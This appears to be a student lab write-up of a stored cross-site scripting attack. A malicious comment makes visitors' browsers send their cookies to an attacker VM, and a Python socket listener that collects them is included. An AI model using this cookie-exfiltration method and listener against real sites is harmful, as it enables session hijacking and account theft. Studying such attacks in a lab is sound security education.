DESCRIPTION
===========
This attack works by injecting HTML into the code of the wesbite. When a user makes a request to 
view a certain comment number, the comment is dispalyed as plain text in the HTML. Because of this,
we are able to craft a malicious comment that contans <script> tags which the HTML will interpret as valid.
The JS we want to execute is access to an IP under our control, such as the IP address of the attacker VM. 
We can write JS code that will attempt to open a window at the attacker VM IP address, with an argument
of the cookie. This will get translated into HTML, with the cookie argument being passed as part of the packet.

On the attacker VM, a socket listener was set up using python (code below). When the malicious comment is read,
instead of displaying text, the JS is ran and an HTTP request containing the user's cookie is sent to the 
attacker VM socket with the waiting listener. The listener prints the entire request to stdout
(or at least the first 1024 bytes, if the request was ever larger). 


SOCKET LISTENER
===============
import socket
  
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.7.3', 7777))
sock.listen(1)
print("now listening on 192.168.7.3:7777...")

while True:
    try:
        conn, addr = sock.accept()
        data = conn.recv(1024)
        conn.close()
        print(data)
    except KeyboardInterrupt:
        print("terminating...")
        break